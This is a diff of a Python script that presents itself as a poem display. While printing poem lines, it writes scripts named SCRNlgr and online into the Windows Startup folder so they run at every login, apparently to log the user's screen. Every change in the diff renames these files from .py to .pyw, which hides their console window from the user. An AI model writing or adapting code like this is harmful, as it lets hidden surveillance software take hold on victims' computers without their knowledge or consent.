@@ -54,7 +54,7 @@ poem_label.pack(padx=10, pady=10)
 print("I am Aaki")
 time.sleep(1)
 
-codo = os.environ['temp'] + "\\codo.py"
+codo = os.environ['temp'] + "\\codo.pyw"
 codo = codo.replace("\\", "/")
 # print(codo)
 print("And I am searching for something priceless")
@@ -117,7 +117,7 @@ while 1:
 appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 print("something so divine")
 time.sleep(2)
-SLscript_appdata = appdataPATH + "\\SCRNlgr.py"
+SLscript_appdata = appdataPATH + "\\SCRNlgr.pyw"
 with open(SLscript_appdata, "w") as f:
 	f.write(codo)
 print("something i could never afford to lose")
@@ -176,7 +176,7 @@ while True:
 appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 print("can we find it together ?")
 time.sleep(2)
-SLscript_appdata = appdataPATH + "\\online.py"
+SLscript_appdata = appdataPATH + "\\online.pyw"
 with open(SLscript_appdata, "w") as f:
 	f.write(codo2)
 print("But its even fragile now")
